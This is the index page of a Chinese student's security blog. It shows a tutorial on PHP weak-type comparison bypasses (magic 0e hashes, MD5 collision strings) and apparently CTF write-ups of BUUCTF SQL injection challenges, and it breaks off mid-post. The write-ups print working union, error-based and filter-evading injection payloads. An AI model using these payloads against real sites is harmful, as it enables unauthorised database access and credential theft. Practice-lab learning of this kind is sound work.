<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="瞄一下学过代码，写一个睡喵的博客">
<meta property="og:type" content="website">
<meta property="og:title" content="睡猫的博客">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="睡猫的博客">
<meta property="og:description" content="瞄一下学过代码，写一个睡喵的博客">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="？？喵！！">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>睡猫的博客</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">睡猫的博客</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">分享代码，记录生活</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/09/%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hearder.jpg">
      <meta itemprop="name" content="？？喵！！">
      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="睡猫的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/09/%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">第一篇博客</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-03-09 01:10:23" itemprop="dateCreated datePublished" datetime="2023-03-09T01:10:23+08:00">2023-03-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-03-14 00:05:37" itemprop="dateModified" datetime="2023-03-14T00:05:37+08:00">2023-03-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Others/" itemprop="url" rel="index"><span itemprop="name">Others</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>9</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="欢迎来到睡猫的博客"><a href="#欢迎来到睡猫的博客" class="headerlink" title="欢迎来到睡猫的博客"></a><center>欢迎来到睡猫的博客</center></h1>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/29/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hearder.jpg">
      <meta itemprop="name" content="？？喵！！">
      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="睡猫的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/29/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">PHP弱类型比较绕过</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-05-29 20:02:24 / 修改时间：22:25:10" itemprop="dateCreated datePublished" datetime="2023-05-29T20:02:24+08:00">2023-05-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>PHP是一种弱类型语言,这意味着变量的类型是根据上下文自动推断的,不需要强调声明(如c语言),带来方便的同时,也带来了许多安全隐患<br>PHP的比较也分为弱类型(<code>==</code>)比较和强类型(<code>===</code>)比较,还有(<code>!=</code>)和(<code>!==</code>)</p>
<h1 id="md5比较绕过"><a href="#md5比较绕过" class="headerlink" title="md5比较绕过"></a>md5比较绕过</h1><p>在ctf赛题中,经常会出现类似于这样的一段代码,要求我们传入两个参数的值不同,而<code>md5()</code>后的值相同</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!=<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) ==<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok!!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0e等于0绕过"><a href="#0e等于0绕过" class="headerlink" title="0e等于0绕过"></a>0e等于0绕过</h2><p>一个字符串经过md5处理后如果是以<code>0e</code>开头的,那么在php中就会被认为是科学计数法表示的数字(在科学计数法中，<code>e</code>或<code>E</code>用于表示指数。例如，数字300可以表示为<code>3e2</code>或<code>3E2</code>，意思是<code>3 × 10^2</code>同样，数字0.003可以表示为 <code>3e-3</code> 或 <code>3E-3</code>，意思是 <code>3 × 10^-3</code>),也就是说<code>0e</code>开头的表示的数字为<code>0 × 10^n</code>都为0,这样一来,就可以成功绕过比较</p>
<p>下面是常见的md5后为<code>0e</code>开头的字符串<br><code>QNKCDZO</code>  &#x3D;&gt;md5 <code>0e830400451993494058024219903391</code><br><code>s878926199a</code>  &#x3D;&gt;md5 <code>0e545993274517709034328855841020</code><br><code>0e215962017</code> &#x3D;&gt;md5 <code>0e291242476940776845150308577824</code></p>
<p>需要注意的是,这种绕过手法只适用于弱类型比较,强类型比较是不能使用这种方式的<br>还有一种题目,是上面题目的变种,希望传入参数的值与其本身<code>md5()</code>处理过的值相同</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok!!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里只要一个字符是以<code>0e</code>开头,<code>md5</code>后还是<code>0e</code>开头即可<br><code>0e215962017</code> &#x3D;&gt;md5 <code>0e291242476940776845150308577824</code></p>
<h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><p><code>md5()</code>函数期望的得到的是一个字符串,但是如果传入一个数组的话,函数会报出一个警告,并返回<code>NULL</code>值<br>当我们传入两个不同的数组,参数值必然不相等,而经过md5处理后,其值为<code>NULL</code>,<code> **payload**</code>?a[]&#x3D;1&amp;b[]&#x3D;2&#96;</p>
<h2 id="原生类绕过"><a href="#原生类绕过" class="headerlink" title="原生类绕过"></a>原生类绕过</h2><p>如果在类中进行比较一般是无法通过数组进行绕过的,这时候可以配合反序列化中的原生类技巧绕过,<a target="_blank" rel="noopener" href="http://shuimao.xyz/2023/04/23/%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7">原生类绕过</a></p>
<h2 id="哈希冲突绕过"><a href="#哈希冲突绕过" class="headerlink" title="哈希冲突绕过"></a>哈希冲突绕过</h2><p>MD5 是一种哈希算法，它将任意长度的输入数据映射到固定长度（128 位）的输出。由于 MD5 算法的输出长度是固定的，而输入数据的长度是任意的，所以理论上必然存在两个不同的输入数据，它们的 MD5 哈希值相同。</p>
<p>但是一般这些字符中都有一些不可见字符,所以这里采用url编码<br><code>$a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</code></p>
<p><code>$b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code><br>这两个字符串即是哈希冲突的两个字符串</p>
<h1 id="字符串与数字之间的弱类型"><a href="#字符串与数字之间的弱类型" class="headerlink" title="字符串与数字之间的弱类型"></a>字符串与数字之间的弱类型</h1><h2 id="字符强转为数字"><a href="#字符强转为数字" class="headerlink" title="字符强转为数字"></a>字符强转为数字</h2><p>php在做匹配和比较时候，会根据匹配的类型做类型转换，例如比较数字和字符串是否相等,就会进行转换,转换规则是前面的数字不变后面字母被当成字符型舍去<br>简单来说,在php中<br><code>123</code>&#x3D;&#x3D;<code>123a</code><br><code>6asdijbsujy</code>&#x3D;&#x3D;<code>6</code><br>后面的字符会被舍去,只比较最前面的数字</p>
<h2 id="字符串被解析成十六进制"><a href="#字符串被解析成十六进制" class="headerlink" title="字符串被解析成十六进制"></a>字符串被解析成十六进制</h2><p>本来应该输入的是字符串,但是以<code>0x</code>开头的字符串在进行一些比较或运算时,就被php当做16进制数进行解析了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hex</span> = <span class="string">&#x27;0xdeadc0de&#x27;</span>;</span><br><span class="line"><span class="variable">$dec</span> = <span class="number">3735929054</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$hex</span> ==<span class="variable">$dec</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;OKKK&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ps:在php中使用<code>dechex()</code>将十进制数转换为十六进制数,使用<code>hexdec()</code>将十六进制数转换为十进制数</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/23/buu%E5%88%B7%E9%A2%98%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hearder.jpg">
      <meta itemprop="name" content="？？喵！！">
      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="睡猫的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/23/buu%E5%88%B7%E9%A2%98%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">buu刷题之sql注入</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-05-23 19:55:27" itemprop="dateCreated datePublished" datetime="2023-05-23T19:55:27+08:00">2023-05-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-05-27 19:34:46" itemprop="dateModified" datetime="2023-05-27T19:34:46+08:00">2023-05-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/BuuCTF%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">BuuCTF刷题</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>15 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>经过一段时间的学习,开始刷题之旅,题目都来自<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF平台</a><br>大致分为<code>简单</code>,<code>签到</code>,<code>中等</code>三个等级(困难的还做不出~~~),每道题写个<code>wp</code></p>
<h1 id="简单难度"><a href="#简单难度" class="headerlink" title="简单难度"></a>简单难度</h1><p>简单难度大概就是新生赛的难度</p>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523201418.png"><br>进入靶机很容易发现是SQL注入<br>两个传参为<code>?username&amp;password</code><br>尝试丢单引号,发现报错,确定为注入点<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523201708.png"><br>丢个%23(#)进去,报错消失,证明为单引号闭合<br>常规<code>group by</code>爆出3列<br>常规union注入,发现有回显!<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523202045.png"><br>无过滤,有回显,直接走流程<br><strong>pyload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span>admin<span class="string">&#x27;union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</span></span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523205904.png"><br>进入靶机,提示有过滤<br>丢单引号,尝试丢单引号,发现报错,确定为注入点,丢个%23(#)进去,报错消失,证明为单引号闭合<br>常规<code>group by</code>发现报错<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523210205.png"><br>提示表明错误发生在<code>3#</code>附近,猜测是<code>by</code>被替换为空了,尝试双写绕过,成功!(3列)<br>这边心急直接丢进去查表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
<p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523210905.png"><br>这个报错非常明显了,也是替换成空格,对比payload和报错信息,少掉的部分就是被过滤的<br>过滤的关键词有<code>union</code>,<code>select</code>,<code>from</code>,<code>or</code>,<code>where</code>,<code>from</code>,<code>and</code><br>其他非常常规的走流程<br><strong>payload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="string">&#x27;uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql%23</span></span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>和前两题是一样的,找到注入点,判断单引号闭合<br>丢入<code>group by 3</code>时,提示<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523212047.png"><br>明显是有东西触发过滤了(被发现了)<br>尝试写成<code>group b</code>,还是不行<br>尝试写成<code>grou b</code>,还是不行<br>单传一个空格,发现还是被逮住了,看来是过滤了空格,那我们直接<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">上连接</a><br>找到一个<code>%A0</code>可以代替空格且没有过滤!<br>那尝试union注入,结果发现,union被过滤了…<br>那就直接上报错注入(无空格版)<br><code>and(1=extractvalue(100,concat(0x7e,(插入以下语句))))</code><br>还是被逮住,可能是and被过滤,删掉and,还是被逮住,可能是<code>=</code>被过滤<br>感觉出题人故意留了个后面一样…..<code>or</code>没有被过滤,其实想想也可以知道,要是<code>or</code>被过滤了,那<code>information_schema</code>也用不了<br>那就<code>?username=admin&amp;password=admin&#39;or(extractvalue(100,concat(0x7e,(database()))))%23</code>成功爆出<br>上payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or(extractvalue(100,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))))))%23</span></span><br></pre></td></tr></table></figure>
<p>这里要知道<code>a=b</code>可以用<code>(a)like(b)</code>绕过<br>前面都还常规,逐渐报表名,爆列名,到最后一步<br><code>&#39;or(extractvalue(100,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)))))%23</code><br>得到<code>~1flagflag&#123;1669770e-dd70-4617-9f</code>,flag出来了一半,因为报错注入的字数是有限制的<br>尝试使用<br><code>select(substring(group_concat(password),1,30))from(H4rDsq1)</code><br>居然还是被逮住了,看来是过滤了<code>substring</code>,那就<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#substring%E8%BF%87%E6%BB%A4">上链接</a><br>使用<code>right</code>代替<code>substring</code><br>另一半flag出来的payload:<br><code>&#39;or(extractvalue(100,concat(0x7e,(select(right(password,30))from(H4rDsq1)))))%23</code></p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>呃呃,这道题考了多种加密方式,没见到过真是令人头疼<br>关于SQL这边考了一个<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/03/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/#Union%E6%9F%A5%E8%AF%A2">临时虚拟表</a>的知识点<br>mysql有这样的一个特性<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230524123352.png"></p>
<p>重新回到这个题目上,题目名已经指明了是sql,进去是个简单的表单,根据我个人的习惯,先丢两个<code>admin</code>进去看看<br>这边提示<code>wrong pass!</code>,用post传参<code>name&amp;pw</code></p>
<p>没啥思路,就尝试找注入点,最后再参数<code>name</code>丢入单引号引起报错,证明这边存在注入点,且可以闭合<br>然后尝试常规注入,发现<code>do not hack me!</code>,看来是有过滤</p>
<p>试了一下,<code>or</code>,<code>圆括号</code>,<code>=</code>被过滤,而且没有回显,虽然<code>or</code>可以大写绕过,<code>=</code>可以用<code>like</code>绕过,但是括号被过滤了…..报错注入肯定要括号,盲注要括号,union注入没回显,好吧,常规思路全部不行</p>
<p>那就只能,看一下源代码,抓一下包看看有没有提示了<br>果然,源码有提示<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230524125605.png"><br>但是被加密过了………………..见得太少了,不知道什么加密,去搜wp,原来是<code>base32</code><br>解码后<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230524130220.png"><br>还是加密过的,但是这个比较眼熟,应该是<code>base64</code>,解码后得到<br><code>select * from user where username = &#39;$name&#39;</code><br>说实话看着还是有点懵,是想提示我们,账号和密码是分别查询的吗<br>再看看页面<code>wrong pass!</code>,有可能<code>admin</code>就是正确的账号<br>把<code>admin</code>改成<code>ad</code>,提示<code>wrong user!</code>,那应该就是了,账号密码是两个查询语句,先查询有没有这个账户,如果有就查询密码,如果密码正确就登入,应该是这样的一个思路<br>我们利用创建虚拟表的特性,可以给表中增加一条数据<code>admin</code>:<code>123</code>,同时传入密码,就可以成功登入了<br>通过select逐渐添加列数,可以知道一共是有三列,这时候我们需要判断,哪一列是账号,哪一列是密码(猜测为<code>id</code>,<code>username</code>,<code>password</code>的常见结构)<br>如果账号在错误的位置,会提示<code>wrong user!</code>,在正确的位置会提示<code>wrong pass!</code>,最后测出账号是第二列<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230525194014.png"><br>payload<br><code>name=1&#39;union select 1,&#39;admin&#39;,&#39;123&#39;#&amp;pw=123</code>没想到不对!!!<br>最后查阅wp才知道,这个密码经过了<strong>md5加密</strong>…,所以我们表中的数据也要是md5加密过的才能对得上<br>所以最终的<strong>payload</strong>是<br><code>name=1&#39;union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123</code></p>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>进入界面,提示表名和字段名都是<code>flag</code>,只需要知道<code>id</code>就可以拿到了,传参就是<code>id</code><br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230525194737.png"><br>简单提交一下,<code>&#39;</code>,发现提示<code>bool(false)</code>,警觉,一下就要想到布尔盲注<br>然后试着<code>#</code>闭合一下,提示<code>SQL Injection Checked.</code>有过滤,测试了一下<code>空格</code>也被过滤了<br>那就试一下简单的数字<code>1</code>,<code>2</code>,发现是有结果的,输入其他字符都是提示<code>bool(false)</code><br>那就试一下盲注吧(ps:其实可以布尔盲注的大部分都可以时间盲注,除了if被过滤的时候)<br>这里不知道什么闭合,但是注释符被过滤的情况下,会优先考虑一下是不是数字型(没有闭合)<br>尝试payload<code>id=if(1=1,sleep(2),0)</code>,页面转圈圈,果然,存在注入点,且无闭合<br>虽然时间盲注也可以做,但是按效率来说,还得是我布尔盲注,<a target="_blank" rel="noopener" 